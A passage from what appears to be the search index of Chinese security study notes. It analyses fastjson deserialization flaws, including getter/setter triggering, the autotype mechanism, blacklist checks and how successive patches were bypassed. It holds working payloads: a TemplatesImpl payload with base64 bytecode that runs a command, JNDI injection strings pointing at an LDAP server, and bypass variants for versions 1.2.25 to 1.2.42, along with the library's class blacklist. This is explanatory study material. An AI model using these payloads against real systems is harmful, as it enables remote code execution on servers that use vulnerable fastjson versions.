\u548c\u53e6\u5916\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u884c\u4e3a\u4e0d\u4e00\u6837\uff1f(\u628a\u6240\u6709\u7684getter\u65b9\u6cd5\u8c03\u7528\u4e86\u4e00\u904d) \u8fd9\u4e2a\u65b9\u6cd5\u7684\u539f\u56e0\u5728\u4e8e parseObject(str) \u65f6\u6700\u7ec8\u8fd4\u56de\u7684\u662fJSONObject\uff0c\u4f1a\u989d\u5916\u8c03\u7528\u4e00\u6b21 toJSON(obj) \u3002 public static JSONObject parseObject ( String text ) { Object obj = parse ( text ); return obj instanceof JSONObject ? ( JSONObject ) obj : ( JSONObject ) toJSON ( obj ); } \u5b8c\u6574\u7684\u8c03\u7528\u94fe\u5982\u4e0b: toJSON() \u65b9\u6cd5\u4f1a\u5c06\u76ee\u6807\u7c7b\u4e2d\u6240\u6709getter\u65b9\u6cd5\u8bb0\u5f55\u4e0b\u6765\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u53bb\u8c03\u7528\u4e86\u6240\u6709\u7684getter\u65b9\u6cd5","title":"fastjson\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u7b2c\u4e8c\u4e2a\u95ee\u9898","text":"\u4e3a\u4ec0\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528 getT1() \uff0c\u800c\u4e0d\u4f1a\u8c03\u7528\u5176\u4ed6\u7684getter\u65b9\u6cd5\uff1f \u8fd9\u4e2a\u95ee\u9898\u7684\u7b54\u6848\u8981\u5230 JavaBeanInfo.build() \u65b9\u6cd5\u4e2d\u53bb\u5bfb\u627e: \u5728 JavaBeanInfo.build() \u65b9\u6cd5\u4e2d\uff0c\u7a0b\u5e8f\u5c06\u4f1a\u521b\u5efa\u4e00\u4e2afieldList\u6570\u7ec4\u6765\u5b58\u653e\u540e\u7eed\u5c06\u8981\u5904\u7406\u7684\u76ee\u6807\u7c7b\u7684 setter\u65b9\u6cd5\u53ca\u67d0\u4e9b\u7279\u5b9a\u6761\u4ef6\u7684getter\u65b9\u6cd5\u3002 \u90a3\u4e48\u4ec0\u4e48getter\u65b9\u6cd5\u6ee1\u8db3\u6761\u4ef6\u5462\uff1f if ( methodName . length () >= 4 && ! Modifier . isStatic ( method . getModifiers ()) && methodName . startsWith ( \"get\" ) && Character . isUpperCase ( methodName . charAt ( 3 )) && method . getParameterTypes (). length == 0 && ( Collection . class . isAssignableFrom ( method . getReturnType ()) || Map . class . isAssignableFrom ( method . getReturnType ()) || AtomicBoolean . class == method . getReturnType () || AtomicInteger . class == method . getReturnType () || AtomicLong . class == method . getReturnType ())) { //... } // \u5982\u679c\u5b58\u5728setter\u65b9\u6cd5\uff0c\u8be5\u6210\u5458\u53d8\u91cf\u540d\u4f1a\u88ab\u52a0\u5165fieldList\uff0cfieldInfo\u5c31\u4e0d\u4e3anull\uff0c\u90a3\u4e48getter\u65b9\u6cd5\u5c31\u4e0d\u4f1a\u52a0\u5165fieldList fieldInfo = getField ( fieldList , propertyName ); if ( fieldInfo == null ) { if ( propertyNamingStrategy != null ) { propertyName = propertyNamingStrategy . translate ( propertyName ); } add ( fieldList , new FieldInfo ( propertyName , method , ( Field ) null , clazz , type , 0 , 0 , 0 , annotation , ( JSONField ) null , ( String ) null )); } \u5373\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6: - \u5bf9\u5e94\u6210\u5458\u53d8\u91cf\u7ee7\u627f\u81eaCollection/AtomicBoolean/AtomicInteger/AtomicLong - \u5bf9\u5e94\u6210\u5458\u53d8\u91cf\u6ca1\u6709setter\u65b9\u6cd5 - get\u5f00\u5934\u4e14\u7b2c\u56db\u4e2a\u5b57\u6bcd\u5927\u5199 - \u4e3a\u975e\u9759\u6001\u65b9\u6cd5\uff0c\u65e0\u53c2\u6570\u4f20\u5165 - \u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf\u4e3a\u79c1\u6709\u53d8\u91cf(\u5982\u679c\u662f\u516c\u6709\u53d8\u91cf\u5219\u4f1a\u76f4\u63a5\u8d4b\u503c)","title":"\u7b2c\u4e8c\u4e2a\u95ee\u9898"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u4e00\u4e9b\u5176\u4ed6\u6ce8\u610f\u4e8b\u9879","text":"\u4e0a\u9762\u7684\u793a\u4f8b\u4ee3\u7801\u4e2d\u6709\u4e00\u4e2a\u6bd4\u8f83\u5947\u602a\u7684\u5730\u65b9\uff0c\u6211\u4eec\u662f\u76f4\u63a5\u6784\u9020\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53bb\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u4e14\u8be5\u5b57\u7b26\u4e32\u4e2d\u8fd8\u5305\u542b\u4e86 @type \u8fd9\u4e2a\u9879\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7528 toJSONString() \u7684\u5b57\u7b26\u4e32\u53bb\u53cd\u5e8f\u5217\u5316\uff0c\u7ed3\u679c\u662f\u4e0d\u662f\u4e0d\u4e00\u6837\u5462\uff1f\u4ee3\u7801\u6700\u7ec8\u7684\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b: call constructor -------toJSONString()------ call get id call get name call get t1 {\"id\":5,\"name\":\"tom\",\"t1\":{}} -------parse(str)------ {\"name\":\"tom\",\"id\":5,\"t1\":{}} -------parseObject(str)------ {\"name\":\"tom\",\"id\":5,\"t1\":{}} -------parseObject(str, User.class)------ call default constructor call set id call set name call get t1 User{id=5, name='tom', t1=null} \u53ef\u4ee5\u770b\u5230 parse(str) \u548c parseObject(str) \u4e0d\u518d\u8c03\u7528getter\u548csetter\u65b9\u6cd5\uff0c\u800c\u662f\u8fd4\u56de\u4e86\u4e00\u4e2aJSONObject\u7c7b\u578b\uff0c\u5e76\u6ca1\u6709\u5c06\u7c7b\u578b\u8f6c\u6362\u4e3aUser\u7c7b\u578b\uff0c\u800c parseObject(str, User.class) \u5219\u5b9e\u73b0\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u4f9d\u7136\u8c03\u7528\u4e86setter\u65b9\u6cd5\u548c\u67d0\u4e9bgetter\u65b9\u6cd5\u3002 \u6240\u4ee5\u6211\u4eec\u4e3a\u4e86\u80fd\u591f\u89e6\u53d1getter\u548csetter\u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528\u5230@type\u8fd9\u4e2a\u9879\uff0c@type\u662ffastjson\u4e2d\u7279\u6709\u7684\u9879\uff0c\u7528\u4e8e\u6807\u6ce8\u8fd9\u4e2a\u5bf9\u8c61\u7684\u7c7b\u578b\uff0c\u5f53fastjson\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u5c06\u8be5\u5bf9\u8c61\u8fdb\u884c\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\uff0c\u8fd9\u4e5f\u662ffastjson\u53cd\u5e8f\u5217\u5316\u7684\u7f6a\u9b41\u7978\u9996\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3aautotype\u3002","title":"\u4e00\u4e9b\u5176\u4ed6\u6ce8\u610f\u4e8b\u9879"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#fastjson\u53cd\u5e8f\u5217\u5316","text":"","title":"fastjson\u53cd\u5e8f\u5217\u5316"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u53ef\u5229\u7528\u7684\u7c7b","text":"","title":"\u53ef\u5229\u7528\u7684\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#templatesimpl","text":"\u8fd9\u4e2a\u662f\u6211\u4eec\u7684\u8001\u670b\u53cb\u4e86\uff0c\u53ef\u4ee5\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u6216\u7f51\u4e0a\u7684\u6587\u7ae0\u4e2d\u627e\u5230\u5173\u4e8e\u5b83\u7684\u4ecb\u7ecd\u3002\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u80fd\u591f\u8c03\u7528\u5230 TemplatesImpl.getOutputProperties() \u65b9\u6cd5\uff0c\u6700\u7ec8\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u7ed3\u5408\u524d\u9762\u7684\u5206\u6790\uff0c\u6211\u4eec\u60f3\u8981\u89e6\u53d1getter\u65b9\u6cd5\uff0c\u9700\u8981\u6ee1\u8db3\u4e00\u5b9a\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5426\u6ee1\u8db3\u6761\u4ef6: // \u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf private Properties _outputProperties ; // getter\u65b9\u6cd5 public synchronized Properties getOutputProperties () { try { return newTransformer (). getOutputProperties (); } catch ( TransformerConfigurationException e ) { return null ; } } \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6210\u5458\u53d8\u91cf\u5b8c\u7f8e\u5730\u6ee1\u8db3\u4e86\u6211\u4eec\u7684\u6761\u4ef6\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u7591\u60d1: _outputProperties \u80fd\u591f\u548c getOutputProperties() \u65b9\u6cd5\u5bf9\u5e94\u5417\uff1f(\u591a\u4e86\u4e00\u4e2a\u4e0b\u5212\u7ebf)","title":"TemplatesImpl"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#smartmatch","text":"fastjson\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u5728 JavaBeanDeserializer.parseField() \u65b9\u6cd5\u4e2d\u4f7f\u7528\u4e86 smartMatch() \u8fd9\u4e2a\u65b9\u6cd5\u6765\u5bfb\u627e\u5bf9\u5e94\u7684\u6210\u5458\u53d8\u91cf: public boolean parseField ( DefaultJSONParser parser , String key , Object object , Type objectType , Map < String , Object > fieldValues ) { JSONLexer lexer = parser . lexer ; FieldDeserializer fieldDeserializer = smartMatch ( key ); //... return true ; } public FieldDeserializer smartMatch ( String key ) { // ... if ( fieldDeserializer == null ) { snakeOrkebab = false ; String key2 = null ; for ( i = 0 ; i < key . length (); ++ i ) { char ch = key . charAt ( i ); if ( ch == '_' ) { snakeOrkebab = true ; key2 = key . replaceAll ( \"_\" , \"\" ); break ; } if ( ch == '-' ) { snakeOrkebab = true ; key2 = key . replaceAll ( \"-\" , \"\" ); break ; } } // ... } \u53ef\u4ee5\u770b\u5230\u5176\u4f1a\u5c06\u6210\u5458\u53d8\u91cf\u4e2d\u7684 - , _ \u5ffd\u7565\u6389\uff0c\u4ece\u800c\u4f7f\u5f97 _outputProperties \u80fd\u591f\u548c getOutputProperties() \u65b9\u6cd5\u5bf9\u5e94\u3002","title":"smartMatch"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#payload","text":"{ \"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" , \"_bytecodes\" : [ \"yv66vgAAADMAHAEAA0NhdAcAFgEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIQ2F0LmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQALbm90ZXBhZC5leGUIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAFkV2aWxDYXQ2NTM4ODI3MzI3MTQxMDABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAXAQAGPGluaXQ+DAAZAAgKABgAGgAhAAIAGAAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABkACAABAAkAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG\" ], \"_name\" : \"a\" , \"_tfactory\" : {}, \"outputProperties\" : {} } \u8fd9\u91cc\u6709\u51e0\u4e2a\u6ce8\u610f\u4e8b\u9879: 1. _bytecodes \u4e2d\u5c06\u5b57\u8282\u7801\u4f7f\u7528base64\u7f16\u7801\uff0c\u8fd9\u662f\u56e0\u4e3afastjson\u4f1a\u5bf9byte\u7c7b\u578b\u7684\u5b57\u6bb5\u8fdb\u884cbase64\u89e3\u7801\u7684\u7f18\u6545\uff0c\u8fd9\u4e5f\u65b9\u4fbf\u4e86\u6211\u4eec\u6784\u9020payload 2. _bytecode \u4e2d\u7684\u5b57\u8282\u7801\u662f\u4e00\u4e2a\u6784\u9020\u597d\u7684class\u7c7b\uff0c\u5176static\u5757\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u53cd\u7f16\u8bd1\u540e\u5927\u81f4\u5982\u4e0b: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; public class EvilCat653882732714100 extends AbstractTranslet { static { Runtime . getRuntime (). exec ( \"notepad.exe\" ); } public EvilCat653882732714100 () { } } 4. \u8fd9\u4e2a\u7c7b\u53ea\u80fd\u5728\u5f00\u542fSupportNonPublicField\u7279\u6027\u7684fastjson\u53cd\u5e8f\u5217\u5316\u4e2d\u4f7f\u7528\uff0c\u56e0\u4e3a _bytecodes , _tfactory \u7b49\u5c5e\u6027\u90fd\u6ca1\u6709\u5bf9\u5e94\u7684setter 5. _tfactory \u8bbe\u7f6e\u4e3a {} \uff0c\u8fd9\u6837fastjson\u4f1a\u751f\u6210\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u89e3\u51b3\u67d0\u4e9bjdk\u7248\u672c\u4e2d defineTransletClasses() \u7528\u5230\u4f1a\u5f15\u7528 _tfactory \u5c5e\u6027\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\u7684\u95ee\u9898","title":"payload"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#jdbcrowsetimpl","text":"\u8fd9\u4e2a\u7c7b\u7684\u5173\u952e\u5728\u4e8e\u5176\u7684 setAutoCommit() \u65b9\u6cd5\uff0c\u6700\u7ec8\u4f1a\u53d1\u51fa\u4e00\u4e2a context.lookup(datasourceName) \u8bf7\u6c42\u5b9e\u73b0JNDI\u6ce8\u5165\u3002","title":"JdbcRowSetImpl"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#payload_1","text":"{ \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }","title":"payload"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u5b89\u5168\u673a\u5236\u4e0ebypass","text":"","title":"\u5b89\u5168\u673a\u5236\u4e0ebypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1225","text":"\u5728fastjson 1.2.25\u4e2d\u4e3a\u4e86\u89e3\u51b3\u53cd\u5e8f\u5217\u5316\u95ee\u9898\uff0c\u52a0\u5165\u4e86\u9ed1\u540d\u5355\u673a\u5236\u548c\u4e00\u4e2a\u5b89\u5168\u5f00\u5173: autotypesupport (\u9ed8\u8ba4\u503c\u4e3afalse)\u3002\u5982\u679c\u6211\u4eec\u5728>=1.2.25\u7248\u672c\u4e2d\u518d\u4f7f\u7528\u4e0a\u8ff0\u7684payload\u4f1a\u62a5\u9519: autoType is not support. \uff0c\u8fd9\u662f\u7531\u4e8e\u6211\u4eec\u4f7f\u7528\u7684\u7c7b\u52a0\u5165\u4e86\u9ed1\u540d\u5355\u7684\u7f18\u6545\u3002 \u6839\u636e\u62a5\u9519\uff0c\u6211\u4eec\u5728 ParserConfig.checkAutoType() \u4e2d\u627e\u5230\u4e86\u9ed1\u540d\u5355\u3002\u6574\u4e2a\u9ed1\u540d\u5355\u5982\u4e0b\uff0c\u53ea\u8981\u6211\u4eec\u4f7f\u7528\u7684\u7c7b\u662f\u4ee5\u8fd9\u4e9b\u5f00\u5934\uff0c\u5c31\u4f1a\u88ab\u9ed1\u540d\u5355\u62e6\u622a\u3002 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework \u7136\u540e\u6211\u4eec\u518d\u770b\u770bautotypesupport\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\uff0c\u901a\u8fc7\u5206\u6790 ParserConfig.checkAutoType() \u53ef\u4ee5\u77e5\u9053\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u5bf9\u5e94\u7684\u7c7b\u7684\u6b65\u9aa4\u5927\u81f4\u5982\u4e0b( fastjson1.2.25\uff0c\u4e0d\u540c\u7248\u672c\u7684\u6b65\u9aa4\u6709\u53ef\u80fd\u6709\u5dee\u5f02 ): \u5982\u679c\u5f00\u542f\u4e86autotypesupport \u6216\u8005expectClass\u4e0d\u4e3a\u7a7a\u65f6\u5219\u6309\u767d\u9ed1\u540d\u5355\u5bfb\u627e\u7c7b(\u5177\u4f53\u6b65\u9aa4\u770b\u4e0b\u65b9) TypeUtils.getClassFromMapping(typeName) :\u5c1d\u8bd5\u4ece\u7f13\u5b58Map\u4e2d\u5bfb\u627e\u7c7b this.deserializers.findClass(typeName) : \u5c1d\u8bd5\u4ecedeserializers\u4e2d\u5bfb\u627e\u7c7b\uff0c\u5176\u4e2dbuckets\u4e2d\u5b58\u653e\u4e86\u4e00\u4e9bjava\u7684\u57fa\u7840\u7c7b \u5982\u679c\u4e0a\u8ff0\u627e\u5230\u4e86\u7c7b\uff0c\u5219\u76f4\u63a5\u8fd4\u56de \u5982\u679c\u672a\u5f00\u542fautotypesupport\u5219\u9ed1\u767d\u540d\u5355\u5bfb\u627e\u7c7b(\u5177\u4f53\u6b65\u9aa4\u770b\u4e0b\u65b9) expectClass\u6821\u9a8c\u548c\u6ce8\u89e3\u6821\u9a8c\uff0c\u5982\u679c\u901a\u8fc7\u5219\u8fd4\u56de \u5982\u679c\u4e0a\u8ff0\u627e\u5230\u4e86\u7c7b\uff0c\u5219\u8fd4\u56de \u672a\u5f00\u542f autoTypeSupport \u5219\u629b\u51fa\u5f02\u5e38(\u62e6\u622a)","title":"1.2.25"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u672a\u5f00\u542fautotypesupport","text":"\u5f53\u672a\u5f00\u542fautotyesupport\u65f6\uff0c\u4f1a\u6709\u4ee5\u4e0b\u7684\u6b65\u9aa4: 1. \u5224\u65adtypename\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d(\u4ee5\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b\u540d\u5f00\u5934)\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u62e6\u622a 2. \u5224\u65adtypename\u662f\u5426\u5728\u767d\u540d\u5355\u4e2d(\u9ed8\u8ba4\u4e3a\u7a7a)\uff0c\u5982\u679c\u662f\u5219\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u7c7b \u53ef\u4ee5\u770b\u5230\u662f\u5148\u8fdb\u884c\u4e86\u4e00\u4e2a\u9ed1\u540d\u5355\u7684\u8fc7\u6ee4\uff0c\u518d\u4ece\u767d\u540d\u5355\u4e2d\u5bfb\u627e\u5141\u8bb8\u7684\u7c7b\u3002","title":"\u672a\u5f00\u542fautotypesupport"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#\u5f00\u542fautotypesupport","text":"\u5f53\u5f00\u542fautotypesupport\u65f6\uff0c\u4f1a\u6709\u4ee5\u4e0b\u7684\u6b65\u9aa4: 1. \u5224\u65adtypename\u662f\u5426\u5728\u5728\u767d\u540d\u5355\u4e2d\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u6839\u636e\u7c7b\u540d\u5bfb\u627e\u7c7b\u5e76\u8fd4\u56de 2. \u5224\u65adtypename\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d(\u4ee5\u9ed1\u540d\u5355\u4e2d\u7684\u7c7b\u540d\u5f00\u5934)\uff0c\u5982\u679c\u662f\u5219\u76f4\u63a5\u62e6\u622a 3. TypeUtils.loadClass(typeName, this.defaultClassLoader) : \u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u53bb\u5bfb\u627e\u7c7b\u5e76\u8fd4\u56de \u6ce8\u610f\u8fd9\u91cc\u7684\u767d\u540d\u5355\u548c\u6211\u4eec\u7406\u89e3\u4e0a\u7684\u767d\u540d\u5355\u5b58\u5728\u51fa\u5165\uff0c\u5728\u767d\u540d\u5355\u4e2d\u7684\u5185\u5bb9\u76f4\u63a5\u901a\u8fc7\uff0c\u4f46\u662f\u4e0d\u5728\u767d\u540d\u5355\u4e2d\u7684\u5185\u5bb9\u4e0d\u4e00\u5b9a\u4e0d\u901a\u8fc7(\u56e0\u4e3a\u5b58\u5728\u6b65\u9aa43\u7684\u7f18\u6545)\u3002 \u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86autotypesupport\u540e\uff0c\u4f9d\u7136\u4f7f\u7528\u4e86\u9ed1\u767d\u540d\u5355\uff0c\u53ea\u662f\u987a\u5e8f\u98a0\u5012\u4e86\u3002\u540c\u65f6\u5047\u5982typename\u901a\u8fc7\u4e86\u9ed1\u767d\u540d\u5355\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7 TypeUtils.loadClass(typeName, this.defaultClassLoader); \u6765\u5bfb\u627e\u7c7b\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u540e\u9762\u4ecb\u7ecd\u7684\u7ed5\u8fc7\u65b9\u6cd5\u4e4b\u4e00\u3002","title":"\u5f00\u542fautotypesupport"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1225-1241-bypass","text":"\u6839\u636e\u4e0a\u8ff0\u7684\u6b65\u9aa4\u6211\u4eec\u53d1\u73b0\u5728typename\u901a\u8fc7\u4e86\u9ed1\u767d\u540d\u5355\u540e\uff0c\u4f1a\u901a\u8fc7 TypeUtils.loadClass(typeName, this.defaultClassLoader); \u6765\u5bfb\u627e\u7c7b\uff0c\u901a\u8fc7\u5206\u6790\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5176\u6b65\u9aa4\u5982\u4e0b: 1. mappings.get(className) \u4ece\u4e00\u4e2a\u7f13\u5b58\u7684mapping\u4e2d\u5bfb\u627e\u7c7b 2. \u5982\u679cclassName\u4ee5 [ \u5f00\u5934\uff0c\u5219\u53bb\u9664\u8fd9\u4e2a\u5f00\u5934\u5e76\u901a\u8fc7\u9012\u5f52\u8c03\u7528\u5f53\u524d\u51fd\u6570\u5bfb\u627e\u7c7b 3. \u5982\u679cclassName\u4ee5 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e\uff0c\u5219\u53bb\u9664\u8fd9\u4e2a\u5f00\u5934\u7ed3\u5c3e\u5e76\u901a\u8fc7\u9012\u5f52\u8c03\u7528\u5f53\u524d\u51fd\u6570\u5bfb\u627e\u7c7b 4. \u4f7f\u7528\u4f20\u5165\u7684 classLoader \u5bfb\u627e\u7c7b 5. \u4f7f\u7528\u5f53\u524d\u7ebf\u7a0b\u7684 contextClassLoader \u5bfb\u627e\u7c7b 6. \u4f7f\u7528 Class.forName \u5bfb\u627e\u7c7b \u4ece\u4ee5\u4e0a\u6b65\u9aa4\u6211\u4eec\u5c31\u53d1\u73b0\u4e86\u53ef\u4ee5\u7ed5\u8fc7\u9ed1\u767d\u540d\u5355\u5e76\u80fd\u6210\u529f\u52a0\u8f7d\u7c7b\u7684\u65b9\u6cd5: 1. \u7c7b\u540d\u4f7f\u7528 L \u5f00\u5934\uff0c ; \u7ed3\u5c3e 2. \u7c7b\u540d\u4f7f\u7528 [ \u987a\u4fbf\u4e00\u63d0fastjson\u4e3a\u4ec0\u4e48\u8981\u5904\u7406\u8fd9\u4e9b\u5947\u602a\u7684\u5b57\u7b26\uff0c\u5b9e\u9645\u4e0a\u5b83\u4eec\u662fJNI\u7684\u5b57\u6bb5\u63cf\u8ff0\u7b26\uff0c\u4ee5 L \u5f00\u5934; ; \u7ed3\u5c3e\u4ee3\u8868\u7684\u662fjava\u4e2d\u7684Object\uff0c\u4ee5 [ \u5f00\u5934\u4ee3\u8868\u7684\u662f\u6570\u7ec4\u3002 \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684\u7ed5\u8fc7payload\u4e3a: { \"@type\" : \"Lcom.sun.rowset.JdbcRowSetImpl;\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true } \u6216\u8005 { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [{ \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }]} \u6ce8\u610f\u7b2c\u4e8c\u4e2a\u7ed5\u8fc7\u7684payload\u5e76\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684json\u683c\u5f0f\uff0c\u4f46\u662ffastjson\u80fd\u591f\u6210\u529f\u89e3\u6790","title":"1.2.25-1.2.41 bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1242","text":"\u8fd9\u4e2a\u7248\u672c\u4e3b\u8981\u7684\u5b89\u5168\u6539\u52a8\u662f\u5c06\u9ed1\u540d\u5355\u6539\u4e3ahash\uff0c\u540c\u65f6\u4f7f\u7528hash\u53bb\u5904\u7406\u4e86 L [ ; \u5b57\u7b26\uff0c\u53bb\u9664\u5934\u5c3e\u7684 L [ ; : this . denyHashCodes = new long [] { - 8720046426850100497L , - 8109300701639721088L , - 7966123100503199569L , - 7766605818834748097L , - 6835437086156813536L , - 4837536971810737970L , - 4082057040235125754L , - 2364987994247679115L , - 1872417015366588117L , - 254670111376247151L , - 190281065685395680L , 33238344207745342L , 313864100207897507L , 1203232727967308606L , 1502845958873959152L , 3547627781654598988L , 3730752432285826863L , 3794316665763266033L , 4147696707147271408L , 5347909877633654828L , 5450448828334921485L , 5751393439502795295L , 5944107969236155580L , 6742705432718011780L , 7179336928365889465L , 7442624256860549330L , 8838294710098435315L }; // ... if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { className = className . substring ( 1 , className . length () - 1 ); }","title":"1.2.42"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1225-1242-bypass","text":"\u8fd9\u91cc\u7684\u5904\u7406\u53ea\u662f\u5904\u7406\u4e86\u4e00\u6b21\uff0c\u6240\u4ee5\u5b58\u5728\u7ecf\u5178\u7684\u53cc\u5199\u7ed5\u8fc7\uff0c\u5373\u53cc\u5199 L ; \u3002\u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684\u7ed5\u8fc7payload\u4e3a: { \"@type\" : \"LLcom.sun.rowset.JdbcRowSetImpl;;\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }","title":"1.2.25-1.2.42 bypass"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#1243","text":"\u8fd9\u4e2a\u7248\u672c\u7684fastjson\u5224\u65ad\u53ea\u8981\u4ee5LL\u5f00\u5934\u5c31\u76f4\u63a5\u629b\u51fa\u5f02\u5e38: if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( 1 )) * 1099511628211L == 655656408941810501L ) { throw new JSONException ( 